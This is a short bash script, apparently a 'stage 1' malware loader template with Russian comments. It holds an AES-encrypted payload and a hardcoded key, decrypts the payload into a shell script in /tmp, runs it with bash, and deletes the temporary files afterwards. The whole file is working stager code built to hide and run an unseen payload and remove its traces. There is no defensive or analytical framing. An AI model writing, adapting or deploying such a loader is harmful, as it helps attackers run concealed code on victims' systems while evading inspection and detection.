#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="7c9fb89e2f5cfab5b1203da96e435988:ozPMXvyv4ffFaHFT/O4SjfJZF+Z3jO8qIP/ciloN2epBDk+WQsra897oxfwFWAdBdmj81g0HsVZpy/Z/2HyznELYUiqkv97homF81OZipewYEnha4u2nOzB480wEoh13bhW3142PctySv3WxTxJzXGQ0lhzyj4Ulf3oU08MDY60xrHKR0OH4jmcvab9mIqHTvkiklt/mkj9QLte9e60FoJqSiO1A8umgpbm2wh2sXgA2ywux09HaoSt/8JJ+CxhovkEU3K8CU5EFikysRRF1tYUrCLD1oHVri059uxFOcErpkbYhXpnElmckdLMTu3qRz4FOs2BlNYkqLHlWBhAZwyCOPUuDNGGyKgx2m2oSiRiahDv8hS0k0DeiuE7nXeWe+aHQnX0HpQ7osgbBJttnFFQSxoQxNvyiE+1wFtFCtafh6poKkz6NrsXqgtw/oJA3eMG4pbby33sOOSJxDFLen18GT9Tv2MvJW2cxD4PSG8c="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
